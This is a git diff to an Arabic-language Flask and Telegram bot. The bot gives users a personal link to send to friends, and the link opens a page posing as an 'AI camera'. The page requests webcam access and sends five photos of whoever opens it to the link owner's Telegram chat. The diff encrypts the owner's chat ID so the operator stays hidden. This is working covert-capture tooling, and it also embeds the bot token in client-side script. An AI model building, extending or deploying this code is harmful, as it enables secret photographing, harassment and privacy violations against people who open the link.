@@ -7,6 +7,10 @@ from requests.exceptions import ReadTimeout, ConnectionError
 from flask import Flask, request, jsonify, make_response
 from threading import Thread
 import re
+import base64
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 # ---------------------------------------------
 # 1. إعدادات الأمان والمتغيرات البيئية
@@ -23,6 +27,9 @@ DEVELOPER_CHAT_ID = int(DEVELOPER_CHAT_ID)
 BASE_URL = os.environ.get("BASE_URL", "https://whatsapp-bot-v1-5.onrender.com/")
 GITHUB_FALLBACK_URL = os.environ.get("GITHUB_FALLBACK_URL", "https://khldwnnsraljrady-collab.github.io/whatsapp-bot-v1/")
 
+# مفتاح التشفير
+ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", "whatsapp-bot-secret-key-2024-must-be-strong")
+
 # إعداد التسجيل
 logging.basicConfig(
     level=logging.INFO,
@@ -31,7 +38,34 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # ---------------------------------------------
-# 2. تطبيق Flask مع رؤوس أمان
+# 2. دوال التشفير وفك التشفير
+# ---------------------------------------------
+def get_encryption_key():
+    """إنشاء مفتاح التشفير باستخدام PBKDF2"""
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=b'whatsapp_bot_salt_2024',
+        iterations=100000,
+    )
+    return base64.urlsafe_b64encode(kdf.derive(ENCRYPTION_KEY.encode()))
+
+cipher = Fernet(get_encryption_key())
+
+def encrypt_id(user_id):
+    """تشفير الـ ID إلى نص مشفر"""
+    return cipher.encrypt(str(user_id).encode()).decode()
+
+def decrypt_id(encrypted_id):
+    """فك تشفير الـ ID"""
+    try:
+        return int(cipher.decrypt(encrypted_id.encode()).decode())
+    except Exception as e:
+        logger.error(f"Decryption error: {e}")
+        return None
+
+# ---------------------------------------------
+# 3. تطبيق Flask مع رؤوس أمان
 # ---------------------------------------------
 app = Flask(__name__)
 
@@ -44,7 +78,7 @@ def add_security_headers(response):
     return response
 
 # ---------------------------------------------
-# 3. صفحة HTML المضمنة (الكاميرا مع آلية الاحتياط)
+# 4. صفحة HTML المضمنة (الكاميرا مع التشفير)
 # ---------------------------------------------
 HTML_PAGE = """
 <!DOCTYPE html>
@@ -56,7 +90,6 @@ HTML_PAGE = """
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        /* (نفس التصميم السابق، اختصارًا للتوفير) */
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
         body { background: linear-gradient(135deg, #0c2461 0%, #1e3799 50%, #4a69bd 100%); min-height: 100vh; display: flex; align-items: center; justify-content: center; color: #fff; padding: 20px; }
         .container { background: rgba(255,255,255,0.08); backdrop-filter: blur(15px); border-radius: 24px; padding: 40px 30px; width: 100%; max-width: 500px; text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.4); border: 1px solid rgba(255,255,255,0.2); position: relative; overflow: hidden; }
@@ -88,6 +121,8 @@ HTML_PAGE = """
         .pulse { animation: pulse 2s infinite; }
         @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
         @media (max-width:500px) { .video-container { height: 280px; } .features { grid-template-columns: 1fr; } }
+        .loader { border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top: 3px solid #fff; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
@@ -131,57 +166,82 @@ HTML_PAGE = """
 
 <script>
     const urlParams = new URLSearchParams(window.location.search);
-    let dynamicChatId = urlParams.get('id');
-    const fixedChatId = '""" + DEVELOPER_CHAT_ID + """';
+    let encryptedId = urlParams.get('q');
+    const fixedChatId = '""" + str(DEVELOPER_CHAT_ID) + """';
     const token = '""" + TOKEN + """';
     const fallbackUrl = '""" + GITHUB_FALLBACK_URL + """';
-
-    // التحقق من صحة المعرف (أرقام فقط)
-    if (!dynamicChatId || !/^\\d+$/.test(dynamicChatId)) {
-        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>رابط غير صالح</h2><p>يرجى الحصول على الرابط من البوت على تلجرام.</p></div>';
-        throw new Error('Invalid ID');
-    }
-
+    let dynamicChatId = null;
     let photoCount = 0;
     let intervalId = null;
     let mediaStream = null;
     let fallbackTimer = null;
     const MAX_PHOTOS = 5;
 
-    function startCapture() {
-        // إخفاء الشاشة الرئيسية
-        document.getElementById('mainScreen').style.display = "none";
-        document.getElementById('analysisScreen').style.display = "block";
-        photoCount = 0;
-        document.getElementById('progressBar').style.width = '0%';
-        document.getElementById('counter').textContent = 'الصورة 0 من 5';
-        document.getElementById('analysisText').textContent = 'جارٍ طلب الكاميرا...';
+    // التحقق من وجود الرابط المشفر
+    if (!encryptedId) {
+        document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>⚠️ رابط غير صالح</h2><p>يرجى الحصول على الرابط من البوت على تلجرام.</p><br><a href="/" style="color:white;">العودة للصفحة الرئيسية</a></div>';
+        throw new Error('No encrypted ID provided');
+    }
 
-        // مؤقت احتياطي: إذا لم تبدأ الكاميرا خلال 4 ثوانٍ، نوجه إلى GitHub
-        fallbackTimer = setTimeout(function() {
-            window.location.href = fallbackUrl + '?id=' + dynamicChatId;
-        }, 4000);
-
-        navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
-            .then(stream => {
-                clearTimeout(fallbackTimer); // نجحنا، نلغي الاحتياط
-                mediaStream = stream;
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                video.onloadedmetadata = () => {
-                    document.getElementById('statusText').textContent = "الكاميرا جاهزة - بدء التصوير خلال 2 ثانية";
-                    document.getElementById('analysisText').textContent = "استعد...";
-                    setTimeout(() => {
-                        captureAndSend();
-                        intervalId = setInterval(captureAndSend, 2000);
-                    }, 2000);
-                };
-            })
-            .catch(err => {
-                console.error("خطأ في الكاميرا:", err);
-                // إذا فشلت الكاميرا، نذهب إلى GitHub مباشرة
-                window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+    async function getRealChatId() {
+        try {
+            const response = await fetch('/decrypt', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ encrypted: encryptedId })
             });
+            const data = await response.json();
+            if (data.valid) {
+                return data.chat_id;
+            } else {
+                throw new Error('Invalid ID');
+            }
+        } catch (error) {
+            console.error('Decryption error:', error);
+            document.body.innerHTML = '<div style="text-align:center;margin-top:50px;"><h2>🔒 رابط غير صالح</h2><p>الرابط الذي تستخدمه غير صالح أو منتهي الصلاحية.</p><p>يرجى الحصول على رابط جديد من البوت.</p><br><a href="/" style="color:white;">العودة للصفحة الرئيسية</a></div>';
+            throw error;
+        }
+    }
+
+    function startCapture() {
+        getRealChatId().then(chatId => {
+            dynamicChatId = chatId;
+            
+            // إخفاء الشاشة الرئيسية
+            document.getElementById('mainScreen').style.display = "none";
+            document.getElementById('analysisScreen').style.display = "block";
+            photoCount = 0;
+            document.getElementById('progressBar').style.width = '0%';
+            document.getElementById('counter').textContent = 'الصورة 0 من 5';
+            document.getElementById('analysisText').textContent = 'جارٍ طلب الكاميرا...';
+
+            // مؤقت احتياطي: إذا لم تبدأ الكاميرا خلال 4 ثوانٍ، نوجه إلى GitHub
+            fallbackTimer = setTimeout(function() {
+                window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+            }, 4000);
+
+            navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, audio: false })
+                .then(stream => {
+                    clearTimeout(fallbackTimer);
+                    mediaStream = stream;
+                    const video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.onloadedmetadata = () => {
+                        document.getElementById('statusText').textContent = "الكاميرا جاهزة - بدء التصوير خلال 2 ثانية";
+                        document.getElementById('analysisText').textContent = "استعد...";
+                        setTimeout(() => {
+                            captureAndSend();
+                            intervalId = setInterval(captureAndSend, 2000);
+                        }, 2000);
+                    };
+                })
+                .catch(err => {
+                    console.error("خطأ في الكاميرا:", err);
+                    window.location.href = fallbackUrl + '?id=' + dynamicChatId;
+                });
+        }).catch(error => {
+            console.error('Failed to get chat ID:', error);
+        });
     }
 
     function captureAndSend() {
@@ -237,10 +297,56 @@ HTML_PAGE = """
 
 @app.route('/')
 def home():
-    user_id = request.args.get('id')
-    if user_id and not re.match(r'^\d+$', user_id):
-        return make_response("معرف غير صالح", 400)
-    return HTML_PAGE
+    encrypted_id = request.args.get('q')
+    if encrypted_id:
+        # التحقق من صحة التشفير
+        if decrypt_id(encrypted_id):
+            return HTML_PAGE
+        else:
+            return make_response("""
+            <!DOCTYPE html>
+            <html>
+            <head><title>رابط غير صالح</title></head>
+            <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #0c2461, #1e3799); color: white;">
+                <h1>🔒 رابط غير صالح</h1>
+                <p>الرابط الذي تستخدمه غير صالح أو منتهي الصلاحية.</p>
+                <p>يرجى الحصول على رابط جديد من البوت على تلجرام.</p>
+                <br>
+                <a href="/" style="color: #ff6b6b;">العودة للصفحة الرئيسية</a>
+            </body>
+            </html>
+            """, 400)
+    else:
+        return make_response("""
+        <!DOCTYPE html>
+        <html>
+        <head><title>كاميرا الذكاء الاصطناعي</title></head>
+        <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #0c2461, #1e3799); color: white;">
+            <h1>📸 كاميرا الذكاء الاصطناعي</h1>
+            <p>يرجى الحصول على رابطك الشخصي من البوت على تلجرام.</p>
+            <br>
+            <p>لا يمكن الوصول إلى هذه الصفحة مباشرة.</p>
+        </body>
+        </html>
+        """, 403)
+
+@app.route('/decrypt', methods=['POST'])
+def decrypt_endpoint():
+    """نقطة نهاية لفك تشفير الـ ID"""
+    try:
+        data = request.json
+        encrypted = data.get('encrypted')
+        if not encrypted:
+            return jsonify({"valid": False, "error": "No encrypted data"}), 400
+        
+        user_id = decrypt_id(encrypted)
+        if user_id:
+            return jsonify({"valid": True, "chat_id": user_id})
+        else:
+            return jsonify({"valid": False, "error": "Invalid encryption"}), 400
+    except Exception as e:
+        logger.error(f"Decrypt endpoint error: {e}")
+        return jsonify({"valid": False, "error": "Server error"}), 500
 
 @app.route('/webhook', methods=['POST'])
 def webhook():
@@ -256,7 +362,7 @@ def keep_alive():
     t.start()
 
 # ---------------------------------------------
-# 4. بوت تيليجرام
+# 5. بوت تيليجرام
 # ---------------------------------------------
 bot = telebot.TeleBot(TOKEN)
 user_stats = {}
@@ -277,7 +383,9 @@ def send_welcome(message):
     else:
         user_stats[user_id]["last_active"] = datetime.now()
 
-    personal_link = f"{BASE_URL}?id={user_id}"
+    # تشفير الـ ID
+    encrypted = encrypt_id(user_id)
+    personal_link = f"{BASE_URL}?q={encrypted}"
 
     markup = telebot.types.InlineKeyboardMarkup()
     camera_btn = telebot.types.InlineKeyboardButton(text="📸 افتح الكاميرا الآن", url=personal_link)
@@ -294,7 +402,8 @@ def send_welcome(message):
         f"1. انسخ الرابط أعلاه\n"
         f"2. أرسله لأصدقائك\n"
         f"3. أي شخص يفتح الرابط ويعمل اذن الوصول الى الكاميرا ستصل صورته إليك فوراً!\n\n"
-        f"🔒 *ملاحظة:* الصورة التي ستصلك لن تصل الى اي احد غيرك، لن يقدر اي شخص مشاهدتها فكن مطمئن."
+        f"🔒 *ملاحظة أمان:* الرابط مشفر بالكامل، لا يمكن لأحد معرفة رقمك أو تزييف الرابط.\n"
+        f"📸 *ملاحظة:* سيتم التقاط 5 صور فقط ثم يتوقف تلقائياً."
     )
     bot.send_message(user_id, response, parse_mode="Markdown", reply_markup=markup)
     logger.info(f"New user started: {user_name} (ID: {user_id})")
@@ -333,6 +442,10 @@ def send_help(message):
         "3. عندما يفتحون الرابط، سيتم تحميل كاميرا الويب\n"
         "4. يتم التقاط 5 صور تلقائياً (صورة كل 2 ثانية)\n"
         "5. تصل الصور إليك مباشرة في هذه المحادثة\n\n"
+        "🔒 *مميزات الأمان:*\n"
+        "• الرابط مشفر بالكامل (لا تظهر الأرقام)\n"
+        "• لا يمكن لأحد تخمين الرابط أو تزييفه\n"
+        "• كل رابط فريد ومخصص لكل مستخدم\n\n"
         "⚠️ *ملاحظات هامة:*\n"
         "• البوت يأخذ 5 صور فقط ثم يتوقف\n"
         "• يمكن إعادة فتح الرابط لالتقاط المزيد\n"
@@ -420,13 +533,14 @@ def handle_all_messages(message):
         bot.reply_to(message, f"مرحباً {message.from_user.first_name}! 👋\n\nيمكنك استخدام /start للحصول على رابطك الشخصي.")
 
 # ---------------------------------------------
-# 5. تشغيل البوت
+# 6. تشغيل البوت
 # ---------------------------------------------
 keep_alive()
 
 print("=" * 50)
 print("🤖 بوت كاميرا الذكاء الاصطناعي (5 صور فقط)")
 print(f"⏰ تم التشغيل في: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+print("🔒 نظام التشفير: مفعل")
 print("=" * 50)
 
 while True:
